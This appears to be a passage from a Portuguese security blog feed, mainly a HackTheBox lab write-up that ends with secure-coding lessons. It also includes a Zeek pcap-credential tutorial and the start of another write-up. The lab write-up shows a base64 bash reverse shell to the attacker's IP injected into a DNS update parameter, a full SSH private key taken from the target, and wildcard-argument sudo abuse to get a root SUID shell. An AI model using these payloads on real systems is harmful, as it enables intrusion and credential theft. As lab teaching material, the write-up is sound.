    <img src="https://i.imgur.com/lVX5Q1W.png"  alt="Página inicial"  class="center"  style="border-radius: 8px;"  />


<p>Inspecionando a página inicial encontramos domínios, que podem ser adicionados ao /etc/hosts para ter acesso através de seu nome. O site informa claramente que se trata de um servidor de DNS dinâmico. Também aparecem credenciais que podem dar acesso a algum recurso no servidor.</p>

    <img src="https://i.imgur.com/cHlj5Ro.png"  alt="Domínios e credencial"  class="center"  style="border-radius: 8px;"  />


<p>Credenciais.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Username: dynadns
Password: sndanyd
</code></pre></div><p>Adicionando os domínios ao /etc/hosts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">dyna.htb
dnsalias.htb
dynamicdns.htb
no-ip.htb
</code></pre></div><p>Acessando a página web com o resultado do scan recebemos a mensagem &ldquo;badauth&rdquo; (não autorizado).</p>

    <img src="https://i.imgur.com/ZGXNCKS.png"  alt="Badauth message"  class="center"  style="border-radius: 8px;"  />


<p>No site do <strong>no-ip</strong> podemos conferir como funciona a API para efetuar <a href="https://www.noip.com/integrate/request">request</a> e obter <a href="https://www.noip.com/integrate/response">response</a>.</p>

    <img src="https://i.imgur.com/okosL9I.png"  alt="Badauth message"  class="center"  style="border-radius: 8px;"  />


<p>Exemplo de requisição para atualizar o DNS.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25
</code></pre></div><p>Exemplo de header GET request.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">GET /nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25 HTTP/1.1
Host: dynupdate.no-ip.com
Authorization: Basic base64-encoded-auth-string
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
</code></pre></div><p>Analisando o exemplo acima, e levando em conta os domínios encontrados no site Dyna DNS, a credencial deve ser enviada em base64 no request. Desta forma o atacante poderá registrar seu nome de subdomínio junto ao servidor.</p>
<h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>A vulnerabilidade está na requisição para executar o update no servidor DNS, especificamente no parâmetro <strong>hostname</strong>. Este é o parâmetro que permite o registro de um nome de subdomínio. E de acordo com o response do servidor, não há tratamento do que está sendo enviado e executado internamente.</p>
<h2 id="exploração">Exploração</h2>
<p>Gerando o payload em base64.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo ‘bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1’ | base64
</code></pre></div><p>Com a hash base64 do comando acima podemos montar o payload para ser injetado no parâmetro hostname pelo BurpSuite.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">`echo &lt;base64-hash&gt; | base64 -d | bash`
</code></pre></div><p>Para adicionar o código malicioso ao hostname o request foi interceptado pelo BurpSuite. Um ponto importante é utilizar <a href="https://www.urlencoder.org/">url encode</a> no payload para que os caracteres especiais sejam aceitos pelo servidor.</p>

    <img src="https://i.imgur.com/fK7IpvY.png"  alt="BurpSuite"  class="center"  style="border-radius: 8px;"  />


<p>O request também pode ser efetuado pelo curl.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://dyna.htb/nic/update?hostname=&lt;payload&gt;dnsalias.no-ip.htb&amp;myip=&lt;tun0-ip&gt;&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Basic ZHluYWRuczpzbmRhbnlk&#34;</span>
</code></pre></div><p>Abrindo uma porta local para receber o &lsquo;reverse shell&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rlwrap nc -lvnp <span style="color:#ae81ff">9001</span>
</code></pre></div><p>Após o envio do request pelo curl ou BurpSuite recebemos a shell do servidor com o usuário www-data.</p>

    <img src="https://i.imgur.com/72YWPtW.png"  alt="Reverse shell"  class="center"  style="border-radius: 8px;"  />


<p>Enumerando o diretório &lsquo;nic&rsquo; foi encontrado um script PHP chamado &ldquo;update&rdquo;, responsável pela atualização de subdomínios no servidor.</p>

    <img src="https://i.imgur.com/FVZpshK.png"  alt="Update file"  class="center"  style="border-radius: 8px;"  />


<p>Analisando o script PHP podemos visualizar a vulnerabilidade no parâmetro <strong>hostname</strong>. O payload é rebebido com <strong>$_GET[&lsquo;hostname&rsquo;]</strong> e armazenado na variável <strong>$h</strong>. Logo abaixo aparece um <strong>$cmd</strong>, que é outra variável e monta a string de comando a ser executada no servidor (e junto vai o comando malicioso injetado pelo atacante). Finalmente surge o comando <strong>system</strong> do PHP que vai executar a string de comando armazenada em <strong>$cmd</strong>.</p>
<p>Estas são as linhas do script que permitiram a exploração da vulnerabilidade através do curl e BurpSuite.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">list</span>($h,$d) <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$_GET[<span style="color:#e6db74">&#39;hostname&#39;</span>],<span style="color:#ae81ff">2</span>); 
$cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;server 127.0.0.1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">zone %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">update delete %s.</span><span style="color:#e6db74">$s\nupdate</span><span style="color:#e6db74"> add %s.%s 30 IN A %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">send</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,$d,$h,$d,$h,$d,$myip);
<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;echo &#34;&#39;</span><span style="color:#f92672">.</span>$cmd<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key&#39;</span>, $retval);
</code></pre></div><p>Neste ponto é necessário uma observação em relação ao desenvolvimento de aplicações e scripts. Receber parâmetros e executá-los sem nenhum tipo de tratamento resulta no que está exposto nesta etapa de exploração, uma invasão a um servidor de DNS. Aqui entra o que atualmente se conhece como &ldquo;desenvolvimento seguro&rdquo;. Isto é, tratar o que é recebido antes de ser executado. A função de um Pentester é justamente explorar estas vulnerabilidades e se houver algum tipo de tratamento, buscar uma maneira de efetuar o &lsquo;bypass&rsquo; utilizando payloads diferentes.</p>
<p>Em busca de credenciais no host encontramos o usuário <strong>bindmgr</strong> com chaves SSH em seu diretório. Porém, sem permissão para leitura na id_rsa.</p>

    <img src="https://i.imgur.com/5QPZ14B.png"  alt="Bindmgr folder"  class="center"  style="border-radius: 8px;"  />


<p>No mesmo diretório do usuário encontramos o diretório support-case-C62796521 com o seguinte conteúdo.</p>

    <img src="https://i.imgur.com/byHP85E.png"  alt="support-case-c62796521 folder"  class="center"  style="border-radius: 8px;"  />


<p>Inspecionando os arquivos da pasta foi localizada a chave SSH no arquivo strace-C62796521.txt.</p>

    <img src="https://i.imgur.com/o3RfTJq.png"  alt="Chave SSH"  class="center"  style="border-radius: 8px;"  />


<p>Com o comando echo podemos criar um arquivo &lsquo;key&rsquo; que será a chave SSH para acessar remotamente o servidor.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37
</span><span style="color:#e6db74">HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\
</span><span style="color:#e6db74">nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+Nz
</span><span style="color:#e6db74">B2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMI
</span><span style="color:#e6db74">fdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPV
</span><span style="color:#e6db74">Ws\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuP
</span><span style="color:#e6db74">Y422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV
</span><span style="color:#e6db74">7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2
</span><span style="color:#e6db74">vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span> &gt; key
</code></pre></div><p>Setando permissões ao arquivo key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> key
</code></pre></div><p>Apesar de ter a chave SSH a conexão não pôde ser realizada porque o servidor não aceita conexões vindas de outros hosts que não tenham seus nomes registrados. A informação pode ser conferida no arquivo authorized_keys na pasta oculta .ssh do usuário bindmgr.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat authorized_keys
</code></pre></div><p>Somente nomes com seus IP&rsquo;s associados e registrados no domínio <strong>infra.dyna.htb</strong> podem se conectar.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">from=&#34;*.infra.dyna.htb&#34;
</code></pre></div><p>Para registrar um nome ao server foi utilizado o <a href="https://www.rtfm-sarl.ch/articles/using-nsupdate.html">nsupdate</a>, que está sendo usado pelo script update.</p>

    <img src="https://i.imgur.com/A035mZ9.png"  alt="Nsupdate"  class="center"  style="border-radius: 8px;"  />


<p>A key do domínio infra está localizada em /etc/bind/infra.key.</p>

    <img src="https://i.imgur.com/WbtrI0Q.png"  alt="infra.key"  class="center"  style="border-radius: 8px;"  />


<p>Exemplo de uso do nsupdate com a key da infra.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nsupdate -k /etc/bind/infra.key
update add haderach.infra.dyna.htb <span style="color:#ae81ff">86400</span> A 10.10.14.110
update add 110.14.10.10.in-addr.arpa <span style="color:#ae81ff">86400</span> PTR haderach.infra.dyna.htb
send
</code></pre></div><p>No último comando nsupdate acima é <a href="https://dnschecker.org/reverse-dns.php">registrado o PTR</a> (pointer record ou reverse DNS record) e informado o IP de forma reversa.</p>

    <img src="https://i.imgur.com/fwKheCe.png"  alt="Nsupdate add"  class="center"  style="border-radius: 8px;"  />


<p>Acessando o servidor via SSH após o registro do nome &ldquo;haderach.infra.dyna.htb&rdquo; e obtendo a flag no arquivo user.txt.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i key bindmgr@10.10.10.244
</code></pre></div>
    <img src="https://i.imgur.com/ThxsBdP.png"  alt="Nsupdate add"  class="center"  style="border-radius: 8px;"  />


<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>O usuário bindmgr possui privilégios de root no script <strong>bindmgr.sh</strong> com o sudo e sem necessidade de informar a senha do usuário.</p>

    <img src="https://i.imgur.com/jFB9Hrf.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />


<p>Conteúdo do script bindmgr.sh.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># This script generates named.conf.bindmgr to workaround the problem</span>
<span style="color:#75715e"># that bind/named can only include single files but no directories.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
<span style="color:#75715e"># from named.conf.local (or others) and will include all files from the</span>
<span style="color:#75715e"># directory /etc/bin/named.bindmgr.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># NOTE: The script is work in progress. For now bind is not including</span>
<span style="color:#75715e">#       named.conf.bindmgr. </span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># TODO: Currently the script is only adding files to the directory but</span>
<span style="color:#75715e">#       not deleting them. As we generate the list of files to be included</span>
<span style="color:#75715e">#       from the source directory they won&#39;t be included anyway.</span>

BINDMGR_CONF<span style="color:#f92672">=</span>/etc/bind/named.conf.bindmgr
BINDMGR_DIR<span style="color:#f92672">=</span>/etc/bind/named.bindmgr

indent<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> sed <span style="color:#e6db74">&#39;s/^/    /&#39;</span>; <span style="color:#f92672">}</span>

<span style="color:#75715e"># Check versioning (.version)</span>
echo <span style="color:#e6db74">&#34;[+] Running </span>$0<span style="color:#e6db74"> to stage new configuration from </span>$PWD<span style="color:#e6db74">.&#34;</span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -f .version <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
    echo <span style="color:#e6db74">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
    exit <span style="color:#ae81ff">42</span>
<span style="color:#66d9ef">fi</span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span style="color:#e6db74">&#34;`cat </span>$BINDMGR_DIR<span style="color:#e6db74">/.version 2&gt;/dev/null`&#34;</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
    echo <span style="color:#e6db74">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
    exit <span style="color:#ae81ff">43</span>
<span style="color:#66d9ef">fi</span>

<span style="color:#75715e"># Create config file that includes all files from named.bindmgr.</span>
echo <span style="color:#e6db74">&#34;[+] Creating </span>$BINDMGR_CONF<span style="color:#e6db74"> file.&#34;</span>
printf <span style="color:#e6db74">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; $BINDMGR_CONF
<span style="color:#66d9ef">for</span> file in * ; <span style="color:#66d9ef">do</span>
    printf <span style="color:#e6db74">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span style="color:#e6db74">&#34;</span>$file<span style="color:#e6db74">&#34;</span> &gt;&gt; $BINDMGR_CONF
<span style="color:#66d9ef">done</span>

<span style="color:#75715e"># Stage new version of configuration files.</span>
echo <span style="color:#e6db74">&#34;[+] Staging files to </span>$BINDMGR_DIR<span style="color:#e6db74">.&#34;</span>
cp .version * /etc/bind/named.bindmgr/

<span style="color:#75715e"># Check generated configuration with named-checkconf.</span>
echo <span style="color:#e6db74">&#34;[+] Checking staged configuration.&#34;</span>
named-checkconf $BINDMGR_CONF &gt;/dev/null
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
    echo <span style="color:#e6db74">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
    named-checkconf $BINDMGR_CONF 2&gt;&amp;<span style="color:#ae81ff">1</span> | indent
    exit <span style="color:#ae81ff">44</span>
<span style="color:#66d9ef">else</span> 
    echo <span style="color:#e6db74">&#34;[+] Configuration successfully staged.&#34;</span>
    <span style="color:#75715e"># *** TODO *** Uncomment restart once we are live.</span>
    <span style="color:#75715e"># systemctl restart bind9</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
        echo <span style="color:#e6db74">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
	systemctl status bind9
    <span style="color:#66d9ef">else</span>
	echo <span style="color:#e6db74">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
    <span style="color:#66d9ef">fi</span>
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>O script verifica se existe um arquivo <strong>.version</strong> com um número de versão na pasta atual e copia todos os arquivos da pasta para o diretório named.bindmgr, como informado na linha abaixo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp .version * /etc/bind/named.bindmgr/
</code></pre></div><p>A forma de escalar privilégios é criar um arquivo .version e copiar o bash (/bin/bash) para a pasta local.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#ae81ff">1</span> &gt; .version
cp /bin/bash .
</code></pre></div><p>Dar a este novo bash um bit <a href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit">SUID</a> e preservar o modo neste binário criando um arquivo &ldquo;&ndash;preserve=mode&rdquo;. Quando o script for executado teremos um binário com privilégios de root em /etc/bind/named.bindmgr/.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +s bash
echo &gt; --preserve<span style="color:#f92672">=</span>mode
</code></pre></div><p>Executando o script com o sudo para copiar o novo bash para o diretório named.bindmgr.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/local/bin/bindmgr.sh 
</code></pre></div><p>Executando a cópia do bash e obtendo a shell do root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/etc/bind/named.bindmgr/bash -p
</code></pre></div>
    <img src="https://i.imgur.com/qx8mMgD.png"  alt="Root shell"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag no arquivo root.txt.</p>

    <img src="https://i.imgur.com/sVdVPFJ.png"  alt="Root flag"  class="center"  style="border-radius: 8px;"  />


<p>Neste writeup alguns pontos importantes sobre segurança puderam ser abordados.</p>
<ul>
<li>Parâmetros devem ser tratados antes de serem passados para execução por uma aplicação ou script.</li>
<li>O sudo deve ser usado com a senha do usuário.</li>
<li>Usar * (asterisco) como argumento em um script pode ser perigoso.</li>
</ul>
<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>Extraindo credenciais e arquivos de pcap com o Zeek</title>
            <link>https://brunomcuesta.github.io/posts/2021/10/extraindo-credenciais-e-arquivos-de-pcap-com-o-zeek/</link>
            <pubDate>Tue, 19 Oct 2021 18:57:35 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/10/extraindo-credenciais-e-arquivos-de-pcap-com-o-zeek/</guid>
            <description>Muitos profissionais da área de segurança defensiva e ofensiva costumam usar o tcpdump e Wireshark para analisar o tráfego de rede e extrair credenciais e arquivos do pcap. Em busca de uma nova ferramenta para análise de pcap encontrei o Zeek.
Esta é a descrição da ferramenta de acordo com a documentação.
Zeek é um analisador de tráfego de rede passivo e de código aberto. Muitos operadores usam Zeek como um monitor de segurança de rede (NSM) para apoiar investigações de atividades suspeitas ou maliciosas.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/H7RHH8G.png"  alt="Zeek"  class="center"  style="border-radius: 8px;"  />


<p>Muitos profissionais da área de segurança defensiva e ofensiva costumam usar o <a href="https://www.tcpdump.org/manpages/tcpdump.1.html">tcpdump</a> e <a href="https://www.wireshark.org/">Wireshark</a> para analisar o tráfego de rede e extrair credenciais e arquivos do pcap. Em busca de uma nova ferramenta para análise de pcap encontrei o <a href="https://docs.zeek.org/en/current/index.html">Zeek</a>.</p>
<p>Esta é a <a href="https://docs.zeek.org/en/current/about.html">descrição</a> da ferramenta de acordo com a documentação.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Zeek é um analisador de tráfego de rede passivo e de código aberto.
Muitos operadores usam Zeek como um monitor de segurança de rede (NSM) 
para apoiar investigações de atividades suspeitas ou maliciosas. 
Zeek também oferece suporte a uma ampla gama de tarefas de análise de 
tráfego além do domínio da segurança, incluindo medição de desempenho 
e solução de problemas.
</code></pre></div><p>O desafio em questão é extrair credenciais FTP e um arquivo PDF de um arquivo chamado &lsquo;invasao.pcap&rsquo; gerado por uma equipe de segurança defensiva. Ao invés de usar o Wireshark para analisar os frames, vamos usar o Zeek.</p>
<p>Instalando o Zeek no Kali Linux.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install zeek
</code></pre></div><p>O Zeek gera arquivos .log e cada arquivo terá o seu conteúdo correspondente. O formato dos logs <a href="https://docs.zeek.org/en/current/log-formats.html">pode ser escolhido pelo usuário</a>, neste caso será usado o json. Além de extrair os dados é possível extrair os arquivos passando como parâmetro o &lsquo;path&rsquo; do seu plugin de extração.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">zeek -C -r invasao.pcap LogAscii::use_json<span style="color:#f92672">=</span>T /usr/share/zeek/policy/frameworks/files/extract-all-files.zeek
</code></pre></div><p>Na imagem abaixo vemos os arquivos gerados pelo Zeek e um diretório &lsquo;extract_files&rsquo; com todos os arquivos que ele extraiu do pcap.</p>

    <img src="https://i.imgur.com/roVHR5M.png"  alt="Diretório com arquivos log"  class="center"  style="border-radius: 8px;"  />


<p>Por padrão o Zeek não mostra as senhas FTP em texto plano, então é necessário alterar o seu arquivo de configuração.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo vi /usr/share/zeek/base/protocols/ftp/info.zeek
</code></pre></div><p>Alterar a linha abaixo de &lsquo;F&rsquo; (false) para &lsquo;T&rsquo; (true).</p>

    <img src="https://i.imgur.com/OUlRBqf.png"  alt="info.zeek"  class="center"  style="border-radius: 8px;"  />


<p>Para visualizar os dados no formato json e de forma colorida pelo terminal é necessário instalar o &lsquo;jq&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install jq
</code></pre></div><p>Com o &lsquo;jq&rsquo; podemos visualizar o conteúdo do arquivo ftp.log e as credenciais FTP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jq . ftp.log
</code></pre></div>
    <img src="https://i.imgur.com/eKAyPZl.png"  alt="ftp.log"  class="center"  style="border-radius: 8px;"  />


<p>Agora podemos acessar a pasta &lsquo;extract_files&rsquo; e conferir os arquivos extraídos. O arquivo sensível é um PDF, então podemos listar os arquivos e identificá-lo pelo seu maior tamanho ou pela sua <strong>fuid</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -lah
</code></pre></div>
    <img src="https://i.imgur.com/BqpCHBs.png"  alt="Listando arquivos"  class="center"  style="border-radius: 8px;"  />


<p>Identificando o arquivo PDF com o comando &lsquo;file&rsquo;.</p>

    <img src="https://i.imgur.com/a2GCQG1.png"  alt="Listando arquivos"  class="center"  style="border-radius: 8px;"  />


<p>Com o arquivo identificado, basta renomeá-lo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mv extract-1569431588.592514-FTP_DATA-FHlq6m1Wa75SNeFFFf documento.pdf
</code></pre></div><p>Abrindo o documento.pdf.</p>

    <img src="https://i.imgur.com/IJ7ywvu.png"  alt="documento.pdf"  class="center"  style="border-radius: 8px;"  />


<p>Neste artigo foi demonstrado como o Zeek pode ser útil para extrair informações confidenciais e arquivos sensíveis de arquivos pcap. Muito recomendado para Blue Team, Red Team, Forensis e CTF Players.</p>
<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Cap</title>
            <link>https://brunomcuesta.github.io/posts/2021/10/hackthebox-cap/</link>
            <pubDate>Sat, 02 Oct 2021 22:36:39 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/10/hackthebox-cap/</guid>
            <description>Nesta máquina do HackTheBox veremos como extrair credenciais de um arquivo .pcap. Com o usuário e senha obtidos o atacante pode logar no host e escalar privilégios abusando da &amp;lsquo;Capabilities&amp;rsquo; no binário do Python3.
Informações da Máquina IP: 10.10.10.245
Sistema Operacional: Linux
Nível de dificuldade: Easy
Varredura e Enumeração Port Scan Iniciando um scan completo em todas as portas TCP abertas com nmap:
# Nmap 7.91 scan initiated Mon Jun 28 13:35:46 2021 as: nmap -v -sV -sC -p 21,22,80 -Pn -oN details.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/7WY2ppN.png"  alt="Cap Cover"  class="center"  style="border-radius: 8px;"  />


<p>Nesta máquina do <a href="https://www.hackthebox.eu/">HackTheBox</a> veremos como extrair credenciais de um arquivo .pcap. Com o usuário e senha obtidos o atacante pode logar no host e escalar privilégios abusando da &lsquo;Capabilities&rsquo; no binário do Python3.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.245</p>
<p>Sistema Operacional: Linux</p>
<p>Nível de dificuldade: Easy</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>Iniciando um scan completo em todas as portas TCP abertas com nmap:</p>
